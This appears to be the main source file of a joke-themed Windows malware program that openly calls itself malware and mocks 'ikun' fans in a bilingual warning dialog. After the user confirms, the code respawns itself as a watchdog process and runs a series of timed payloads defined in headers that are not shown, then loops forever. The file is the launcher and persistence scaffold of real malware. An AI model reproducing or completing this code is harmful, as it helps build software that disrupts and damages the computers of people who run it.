#include "payloads.h"
#include "watchdog.h"

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char * lpCmdLine, int nCmdShow)
{
	if (strcmp(lpCmdLine, RUN_AS_WATCHDOG_IDENTIFICATION) == 0)
	{
		CreateThread(NULL, NULL, WatchDog_Thread, NULL, NULL, NULL);
	}
	else
	{
		if (MessageBox(NULL, "You just ran a malware.  This software is not for ikun use, if you are ikun please do not test.\nIf you are not ikun and have placed it in the prepared test environment, please click 'Yes' to start the test.\n\n你刚刚运行的是一个恶意软件。本软件不供ikun使用，如果你是ikun请不要测试。\n如果你不是ikun，并且已经把它放在了准备好的测试环境中，请点'是'开始测试。", "蔡徐坤", MB_ICONWARNING | MB_YESNO) != IDYES)
			return -1;

		char CurrentFilename[MAX_PATH];
		GetModuleFileName(NULL, CurrentFilename, MAX_PATH);
		ShellExecute(NULL, NULL, CurrentFilename, RUN_AS_WATCHDOG_IDENTIFICATION, NULL, NULL);

		for (int i = 0; i < autorun_payloads_count; i++)
		{
			Sleep(autorun_payloads[i].startup_delay);
			RunPayload(autorun_payloads[i].entrance, NULL);
		}
	}

	for(;;)
		Sleep(50000);

	return 0;
}
